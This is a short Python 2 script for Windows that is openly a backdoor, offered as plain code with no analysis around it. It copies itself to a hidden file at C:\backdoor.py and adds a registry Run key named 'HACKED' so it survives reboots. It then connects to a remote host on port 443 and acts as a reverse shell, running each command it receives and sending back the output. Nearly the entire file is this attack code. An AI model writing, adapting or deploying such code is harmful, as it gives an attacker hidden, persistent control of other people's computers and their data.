import socket,subprocess,os,_winreg,win32api,win32con,shutil
 
class B3mB4m:
     def __init__(self):
          self.HOST = '192.168.2.8'  
          self.PORT = 443
          self.backdoorpath = "C:\\backdoor.py"
          self.copyhimself = shutil.copy("backdoor.py", self.backdoorpath)
          win32api.SetFileAttributes(self.backdoorpath,win32con.FILE_ATTRIBUTE_HIDDEN)
          self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          self.s.connect((self.HOST, self.PORT))
          self.key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
          0, _winreg.KEY_ALL_ACCESS)
          _winreg.SetValueEx(self.key, "HACKED", 0, _winreg.REG_SZ, self.backdoorpath)
          self.key.Close()
 
     def run(self):
          self.s.send('Connection complate ! \n')
          try:
               while 1:
                    self.s.send('>>>  ')
                    data = self.s.recv(1024)
                    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE)
                    stdout_value = proc.stdout.read() + proc.stderr.read()
                    self.s.send(stdout_value)
               self.s.close()
          except:
               print "Connection losting .. "
               sys.exit()
 
if __name__ == '__main__':
    op = B3mB4m()
    op.run()